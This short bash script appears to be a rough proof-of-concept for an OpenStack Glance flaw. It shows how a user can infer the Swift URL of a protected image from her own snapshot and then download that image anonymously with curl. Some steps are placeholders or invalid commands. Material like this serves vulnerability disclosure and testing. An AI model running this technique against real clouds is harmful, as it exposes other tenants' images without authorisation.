#!/bin/bash

# Inputs: 1) name of image to create
#         2) swift api endpoint URL
#         3) The image ID that was created
# Results: Access to possibly protected image.
# References: Bug: #
# Affects: Glance, Icehouse, Juno, Kilo

# set variables
file_name=$1
swift_endpoint=$2
image_id=$3

# This looks like shell API commands
# 1) open.rc sourcing
# 2) client versions and all that jazz

# create own snapshot
glance image-create --name fake_image --file $1 --is-public True

# examine snapshot
get image $3

# download the parent image
curl $2/glance_$3/$3

#1) public image (123) is made available by the cloud admin

#2) a user creates her own snapshot (456)

#3) by looking at the path to her own image (456), and the owner id of
#   (123), the swift URL for the public image can be inferred

#4) the image URL for 123 can be made known

#5) anybody can access the image anonymously, without any credentials.
